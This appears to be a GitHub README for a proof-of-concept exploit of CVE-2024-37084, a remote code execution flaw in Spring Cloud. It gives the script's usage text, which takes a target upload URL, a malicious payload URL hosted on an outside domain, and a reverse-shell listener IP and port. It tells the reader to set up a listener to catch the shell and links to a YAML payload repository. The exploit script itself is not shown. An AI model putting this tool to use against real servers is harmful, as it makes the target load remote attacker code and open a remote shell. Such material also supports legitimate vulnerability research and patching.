# CVE-2024-37084-Poc
Setup ,Analysis , Demo exploit and poc about CVE-2024-37084

# How to use : 
```
 py .\CVE-2024-37084-Poc.py
usage: python CVE-2024-37084-Poc.py --target_url <target_url> --version <version> --payload_url <payload_url> [--listen_ip <listen_ip>] [--listen_port <listen_port>]

PoC for CVE-2024-37084 - Remote Code Execution

optional arguments:
  -h, --help            show this help message and exit
  --target_url TARGET_URL
                        URL of the target server (e.g., http://target_ip:port/api/package/upload)
  --version VERSION     Version of the package (e.g., 5.0.0)
  --payload_url PAYLOAD_URL
                        URL to the malicious payload (e.g., https://too.lewd.se/yaml-payload.jar)
  --listen_ip LISTEN_IP
                        IP to listen for the reverse shell (default: 0.0.0.0)
  --listen_port LISTEN_PORT
                        Port to listen for the reverse shell (default: 4444)
```

Setup listen port to catch the shell :
![image](https://github.com/user-attachments/assets/110fc123-259a-4b72-927d-ab2a55f225ec)


Link setup , analysis and Demo by me [Link](https://kayiyan.gitbook.io/research/cve/cve-2024-37084-spring-cloud-remote-code-execution)

For yaml payload can use : [Link](https://github.com/artsploit/yaml-payload)
